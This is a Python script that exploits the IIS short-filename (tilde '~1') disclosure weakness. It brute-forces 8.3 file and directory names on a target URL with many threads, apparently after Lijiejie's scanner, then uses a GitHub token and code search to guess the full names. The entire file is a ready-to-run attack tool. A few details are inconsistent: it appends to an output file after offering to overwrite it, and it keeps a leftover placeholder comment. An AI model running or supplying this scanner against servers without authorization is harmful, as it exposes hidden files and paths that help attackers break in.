#!/usr/bin/env python

import os
import sys, threading, time, ssl, requests, argparse
import http.client as httplib
import urllib.parse as urlparse
import queue

# We use thread-local storage to keep a connection alive for each thread
thread_local = threading.local()

class GitHubNameSearcher:
    def __init__(self, token=None):
        self.base_url = "https://api.github.com/search/code"
        self.token = token
        self.headers = {"Accept": "application/vnd.github.v3+json"}
        if self.token: self.headers["Authorization"] = f"token {self.token}"

    def search_full_names(self, sfn_prefix, short_ext=None):
        if not self.token: return [], True
        query = f"filename:{sfn_prefix}"
        if short_ext: query += f" extension:{short_ext}"
        params = {"q": query, "per_page": 100}

        while True:
            try:
                response = requests.get(self.base_url, headers=self.headers, params=params)
                if response.status_code == 200:
                    items = response.json().get('items', [])
                    return sorted(list(set(item['name'] for item in items))), False
                elif response.status_code == 401:
                    print("[!] Error 401: Invalid GitHub Token.")
                    return [], True
                elif response.status_code == 403:
                    print("[!] GitHub Rate limit. Sleeping 20s...")
                    time.sleep(20)
                    continue
                return [], False
            except: return [], False

class Scanner(object):
    def __init__(self, target, github_token=None):
        self.target = target.lower()
        if not self.target.startswith('http'): self.target = 'http://%s' % self.target
        self.scheme, self.netloc, self.path, _, _, _ = urlparse.urlparse(self.target)
        if self.path[-1:] != '/': self.path += '/'
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files, self.dirs = [], []
        self.queue = queue.Queue()
        self.msg_queue = queue.Queue()
        self.STOP_ME = False
        self.request_method = 'GET'
        self.github = GitHubNameSearcher(github_token)
        self.thread_local = threading.local()
        threading.Thread(target=self._print_worker, daemon=True).start()

    def _get_conn(self):
        if not hasattr(self.thread_local, "conn"):
            if self.scheme == 'https':
                self.thread_local.conn = httplib.HTTPSConnection(self.netloc, timeout=5)
            else:
                self.thread_local.conn = httplib.HTTPConnection(self.netloc, timeout=5)
        return self.thread_local.conn

    def _get_status(self, path):
        try:
            conn = self._get_conn()
            conn.request(self.request_method, path, headers={"Connection": "keep-alive"})
            res = conn.getresponse()
            status = res.status
            res.read() # Required for persistent connection reuse
            return status
        except:
            if hasattr(self.thread_local, "conn"):
                try: self.thread_local.conn.close()
                except: pass
                del self.thread_local.conn
            return 0

    def is_vulnerable(self, force=False):
        if force: return True
        for m in ['GET', 'OPTIONS']:
            self.request_method = m
            if self._get_status(self.path + '/*~1*/a.aspx') == 404 and \
               self._get_status(self.path + '/l1j1e*~1*/a.aspx') != 404:
                return True
        return False

    def _print_worker(self):
        while not self.STOP_ME or not self.msg_queue.empty():
            try: print(self.msg_queue.get(timeout=0.1))
            except: continue

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=1.0)
                # Exact logic from Lijiejie's scanner
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    if len(url) - len(self.path) < 6:
                        for c in self.alphanum: self.queue.put((url + c, ext))
                    else:
                        if ext == '.*': self.queue.put((url, ''))
                        if ext == '':
                            self.dirs.append(url + '~1')
                            self.msg_queue.put(f"[+] DIR: {url}~1")
                        elif len(ext) == 5 or (not ext.endswith('*')):
                            self.files.append(url + '~1' + ext)
                            self.msg_queue.put(f"[+] FILE: {url}~1{ext}")
                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put((url, ext[:-1] + c + '*'))
                                if len(ext) < 4: self.queue.put((url, ext[:-1] + c))
            except queue.Empty: break

    def resolve_all(self, output_file):
        # (Previous resolution logic with live writing stays here)
        if not self.github.token: return
        ext_list = []
        try:
            with open('extensions.txt', 'r') as f:
                ext_list = [l.strip() if l.startswith('.') else '.' + l.strip() for l in f]
        except: pass

        count = 0
        results = set()
        targets = [('DIR', d) for d in self.dirs] + [('FILE', f) for f in self.files]
        total = len(targets)
        
        f_handle = open(output_file, 'a') if output_file else None
        print(f"\n[+] Phase 2: Short File Name Scanner")

        for i, (stype, surl) in enumerate(targets, 1):
            sfn = surl.split('/')[-1]
            base = sfn.split('~')[0].upper()
            sext = sfn.split('.')[-1].replace('*', '').upper() if '.' in sfn else ""
            
            print(f"Searching for {base = }")
            matches, stop = self.github.search_full_names(base, sext if stype == 'FILE' else None)
            if stop: break
            
            for m in matches:
                if not m.upper().startswith(base): continue
                kw = m.split('.')[0]
                to_add = []
                if stype == 'DIR': to_add.append(kw)
                else:
                    if surl.endswith('*'):
                        for e in ext_list:
                            if e.replace('.','').upper().startswith(sext): to_add.append(kw + e)
                    else: to_add.append(f"{kw}.{sext.lower()}")

                for word in to_add:
                    if word not in results:
                        count += 1
                        print(f"{stype} | {sfn} | {i}/{total} ({count}) | {word}")
                        results.add(word)
                        if f_handle: f_handle.write(word + '\n'); f_handle.flush()
            time.sleep(2) 
        if f_handle: f_handle.close()

    def run(self):
        for c in self.alphanum: self.queue.put((self.path + c, '.*'))
        threads = [threading.Thread(target=self._scan_worker) for _ in range(20)]
        for t in threads: t.start()
        for t in threads: t.join()
        self.STOP_ME = True

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('u', help='Target URL')
    p.add_argument('-t', '--token', help='GitHub Token')
    p.add_argument('-o', '--output', help='Output file')
    p.add_argument('-f', '--force', action='store_true', help='Force scan')
    args = p.parse_args()

    # Verify overwrite if file exists
    if args.output and os.path.exists(args.output):
        choice = input(f"[?] File '{args.output}' already exists. Overwrite? (y/n): ").lower()
        if choice != 'y':
            print("[!] Aborting to protect existing file.")
            sys.exit(0)

    s = Scanner(args.u, args.token)
    if args.force or s.is_vulnerable():
        print("[+] Phase 1: Short File Name Scanner")
        s.run()
        s.resolve_all(args.output)
